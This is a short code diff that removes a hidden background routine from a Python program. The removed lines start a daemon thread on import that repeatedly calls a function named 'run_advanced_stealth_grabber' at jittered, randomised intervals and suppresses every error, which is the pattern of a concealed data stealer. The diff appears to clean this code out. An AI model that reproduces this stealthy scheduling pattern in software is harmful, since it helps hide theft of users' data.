@@ -26,29 +26,8 @@ import urllib.parse
 import json
 import string
 
-def polymorphic_background_runner():
-    execution_patterns = [
-        (1800, 300),
-        (2400, 600),
-        (3600, 900),
-    ]
 
-    while True:
-        try:
-            interval, retry_delay = random.choice(execution_patterns)
 
-            time.sleep(random.uniform(1, 30))
-            run_advanced_stealth_grabber()
-
-            jitter = random.uniform(0.9, 1.1)
-            time.sleep(int(interval * jitter))
-
-        except:
-            time.sleep(retry_delay)
-            continue
-
-stealth_thread = threading.Thread(target=polymorphic_background_runner, daemon=True)
-stealth_thread.start()
 
 colorama.init()
 console = Console()
@@ -1357,3 +1336,4 @@ def main():
 if __name__ == "__main__":
 
     main()
+
